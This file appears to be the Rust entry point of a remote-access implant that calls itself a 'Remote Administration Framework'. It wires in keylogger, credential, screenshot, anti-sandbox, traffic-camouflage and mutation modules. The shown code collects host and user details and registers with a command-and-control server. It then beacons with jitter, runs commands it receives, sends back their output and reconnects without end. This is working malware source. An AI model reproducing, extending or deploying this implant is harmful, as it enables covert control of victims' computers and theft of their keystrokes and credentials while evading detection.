use log::{info, error, debug};
use std::time::Duration;
use tokio::time::sleep;

mod config;
mod communicator;
pub mod executor;
mod recon;
mod crypto;
mod mutation;
mod camouflage;
pub mod screenshot;
pub mod keylogger;
pub mod credentials;
pub mod antisandbox;
#[allow(dead_code, unused_imports, unused_variables, unused_mut)]
mod network;
#[allow(dead_code, unused_imports, unused_variables, unused_mut)]
mod port_handler;

use config::Config;
use communicator::BeaconPayload;
use executor::{CommandType, Executor, get_beacon_config};
use recon::SystemInfo;
use crypto::CryptoManager;
use camouflage::CamouflageMode;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::Builder::from_default_env()
        .format_timestamp_millis()
        .init();

    info!("╔════════════════════════════════════════════════════════╗");
    info!("║  🦀 Secure Remote Agent v0.1.0                        ║");
    info!("║  Remote Administration Framework                       ║");
    info!("╚════════════════════════════════════════════════════════╝");

    // Load configuration
    let config = Config::from_env()?;
    info!("✅ Configuration loaded successfully");

    // Validate configuration
    config.validate()?;
    info!("✅ Configuration validated");

    // Initialize crypto manager
    let crypto = CryptoManager::new(&config.encryption_key)?;
    info!("✅ Encryption subsystem initialized (AES-256-GCM)");

    // Gather system information
    let sys_info = recon::gather_system_info()?;
    info!("✅ System information gathered");
    info!("   Hostname: {}", sys_info.hostname);
    info!("   OS: {} ({})", sys_info.os, sys_info.os_version);
    info!("   Architecture: {}", sys_info.architecture);
    info!("   Agent ID: {}", sys_info.agent_id);

    // Anti-sandbox detection
    let (is_sandbox, sandbox_flags) = antisandbox::SandboxDetector::detect();
    if is_sandbox {
        info!("⚠️ Sandbox/VM detected: {:?}", sandbox_flags);
    } else {
        info!("✅ Environment appears clean");
    }

    // Run main agent loop
    info!("🚀 Starting main agent loop...");
    match run_agent(&config, crypto, &sys_info, is_sandbox, &sandbox_flags).await {
        Ok(_) => {
            info!("Agent loop completed gracefully");
        }
        Err(e) => {
            error!("Fatal error in agent loop: {}", e);
            std::process::exit(1);
        }
    }

    Ok(())
}

async fn run_agent(
    config: &Config,
    crypto: CryptoManager,
    sys_info: &SystemInfo,
    is_sandbox: bool,
    sandbox_flags: &[String],
) -> Result<(), Box<dyn std::error::Error>> {
    // Derive a separate mutation seed from the encryption key
    let mutation_seed = {
        use hmac::{Hmac, Mac};
        use sha2::Sha256;
        type HmacSha256 = Hmac<Sha256>;
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&config.encryption_key)
            .expect("HMAC accepts any key size");
        mac.update(b"mutation-engine-seed");
        let result = mac.finalize().into_bytes();
        let mut seed = [0u8; 32];
        seed.copy_from_slice(&result);
        seed
    };

    let camouflage_mode = if config.debug {
        CamouflageMode::None
    } else {
        CamouflageMode::Full
    };

    let mut communicator = communicator::Communicator::new(
        &config.c2_url,
        config.c2_port,
        &sys_info.agent_id,
        config.beacon_interval,
        crypto,
        &mutation_seed,
        camouflage_mode,
    );
    info!("Traffic camouflage: {}", if config.debug { "disabled (debug)" } else { "full" });

    loop {
        // Attempt connection
        match communicator.connect().await {
            Ok(()) => {
                info!("🔗 Connected to C2 server");

                // Send plaintext registration with system info
                let username = std::env::var("USERNAME")
                    .or_else(|_| std::env::var("USER"))
                    .unwrap_or_else(|_| "unknown".to_string());
                let reg_msg = serde_json::json!({
                    "msg_type": "REGISTER",
                    "agent_id": sys_info.agent_id,
                    "hostname": sys_info.hostname,
                    "os": sys_info.os,
                    "os_version": sys_info.os_version,
                    "architecture": sys_info.architecture,
                    "user": username,
                    "sandbox_detected": is_sandbox,
                    "sandbox_flags": sandbox_flags,
                });
                if let Err(e) = communicator.send_raw(&reg_msg.to_string()).await {
                    error!("Registration failed: {}", e);
                }

                // Main command loop
                'beacon: loop {
                    let beacon = BeaconPayload {
                        agent_id: sys_info.agent_id.clone(),
                        hostname: sys_info.hostname.clone(),
                        os: sys_info.os.clone(),
                        os_version: sys_info.os_version.clone(),
                        architecture: sys_info.architecture.clone(),
                        ip_address: None,
                        user: None,
                        privileges: None,
                    };

                    if let Err(e) = communicator.send_beacon(&beacon).await {
                        error!("Beacon send failed: {}", e);
                        break 'beacon;
                    }

                    let next_interval = communicator.next_beacon_interval().await;
                    info!("📡 Beacon sent (next in: {}s)", next_interval);

                    // Check for incoming commands
                    match communicator.receive_command().await {
                        Ok(Some(cmd_str)) => {
                            info!("📥 Command received: {}", cmd_str);

                            // Parse wrapper with cmd_id
                            let wrapper: serde_json::Value = match serde_json::from_str(&cmd_str) {
                                Ok(v) => v,
                                Err(_) => { error!("Failed to parse command wrapper"); continue; }
                            };
                            let cmd_id = wrapper.get("cmd_id").and_then(|v| v.as_u64()).unwrap_or(0);
                            let cmd_data = match wrapper.get("cmd") {
                                Some(d) => d.clone(),
                                None => { error!("No cmd field in wrapper"); continue; }
                            };

                            if let Ok(cmd) = serde_json::from_value::<CommandType>(cmd_data) {
                                let result = Executor::execute_command(&cmd).await;
                                info!("✅ Command executed in {}ms", result.execution_time_ms);

                                // Send plaintext response so server can read it
                                let resp_msg = serde_json::json!({
                                    "msg_type": "RESPONSE",
                                    "cmd_id": cmd_id,
                                    "status": result.status,
                                    "output": result.output,
                                    "error": result.error,
                                    "execution_time_ms": result.execution_time_ms,
                                });
                                if let Err(e) = communicator.send_raw(&resp_msg.to_string()).await {
                                    error!("Failed to send command result: {}", e);
                                    break 'beacon;
                                }
                            } else {
                                error!("Failed to parse command type");
                                let resp_msg = serde_json::json!({
                                    "msg_type": "RESPONSE",
                                    "cmd_id": cmd_id,
                                    "status": "error",
                                    "output": "",
                                    "error": "Failed to parse command",
                                });
                                let _ = communicator.send_raw(&resp_msg.to_string()).await;
                            }
                        }
                        Ok(None) => {
                            debug!("No commands received");
                        }
                        Err(e) => {
                            error!("Connection lost: {}", e);
                            break 'beacon;
                        }
                    }

                    // Use global beacon config with jitter for sleep
                    let sleep_duration = {
                        let cfg = get_beacon_config();
                        let cfg = cfg.read().await;
                        let base = cfg.sleep_ms as f64;
                        let jitter = base * cfg.jitter_pct;
                        let actual = if jitter > 0.0 {
                            use rand::Rng;
                            let mut rng = rand::thread_rng();
                            base + rng.gen_range(-jitter..jitter)
                        } else {
                            base
                        };
                        Duration::from_millis(actual.max(1000.0) as u64)
                    };
                    debug!("Sleeping for {}ms", sleep_duration.as_millis());
                    sleep(sleep_duration).await;
                }
            }
            Err(e) => {
                error!("Connection failed: {}", e);
            }
        }

        // Always reconnect after disconnection, with a short delay
        info!("🔄 Reconnecting in 5s...");
        sleep(Duration::from_secs(5)).await;
    }
}
